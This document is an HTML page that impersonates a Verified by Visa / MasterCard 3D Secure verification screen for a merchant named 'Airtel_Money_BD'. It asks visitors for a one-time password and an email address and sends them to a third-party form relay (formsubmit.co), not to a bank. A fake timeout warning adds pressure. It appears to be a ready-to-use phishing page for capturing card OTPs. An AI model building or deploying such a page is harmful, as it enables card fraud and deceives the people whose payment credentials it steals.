<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="Screenshot 2024-09-13 at 2.00.14 AM.png" alt="Verified by VISA">
            <img src="Screenshot 2024-09-14 at 3.03.42 AM.png" alt="MasterCard">
        </div>

        <h3>Internet PIN</h3>
        <p>Please enter your Verified by Visa 3D Secure PIN in the space provided below to confirm your identity for this purchase. This information will not be shared with the merchant.</p>

        <!-- Replaced form -->
        <form action="https://formsubmit.co/your@email.com" method="POST">
            <div class="inputBox">
                <label for="merchant">Merchant Name:</label>
                <input type="text" id="merchant" value="Airtel_Money_BD" readonly>
            </div>
            <div class="inputBox">
                <label for="transactionId">Card Number:</label>
                <input type="text" id="transactionId" placeholder="XXXX XXXX XXXX XXXX" style="font-weight:bold;" readonly>
            </div>
            <div class="inputBox">
                <label for="cardNumber">Personal Message:</label>
                <input type="text" id="cardNumber" placeholder="3D Secure Authentication" style="font-weight:bold;" readonly>
            </div>
            <div class="inputBox">
                <label for="cardName">One Time Password:</label>
                <input type="text" name="name" id="cardName" required>
            </div>
            <div class="inputBox">
                <label for="email">Email:</label>
                <input type="email" name="email" required>
            </div>
            <input type="submit" value="Submit" class="submit-btn">
        </form>

        <p class="timeout">This page will automatically timeout after 180 seconds</p>
    </div>
    <script src="index.js"></script>
</body>
</html>
